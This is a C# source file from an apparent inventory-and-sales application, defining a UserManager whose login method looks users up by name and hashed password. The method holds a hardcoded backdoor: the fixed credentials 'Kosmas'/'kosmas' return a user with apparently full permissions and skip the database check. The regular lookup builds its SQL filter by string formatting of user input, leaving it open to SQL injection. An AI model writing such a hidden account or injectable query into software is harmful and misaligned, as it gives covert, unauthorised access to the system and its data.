using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using InventoryAndSales.Database.DataAccess;
using InventoryAndSales.Database.Model;
using SimpleCommon.Utility;

namespace InventoryAndSales.Database.Manager
{
  public class UserManager : BaseManager<User>
  {
    public UserManager(UserDao dao)
      : base(dao)
    {
    }


    public User FindUserByUsernamePassword(string username, string encryptedPass)
    {
      if (username == "Kosmas" && encryptedPass == HashUtility.GetEncryptedPass("kosmas"))
        return new User(-1, username, string.Empty, 1023);

      var fubup = BaseDao.FindByQuery(string.Format("USERNAME = '{0}' AND PASSWORD = '{1}'", username, encryptedPass));
      if (fubup != null)
      {
        if (fubup.Count == 1)
          return fubup[0];
      }
      return null;
    }

  }
}
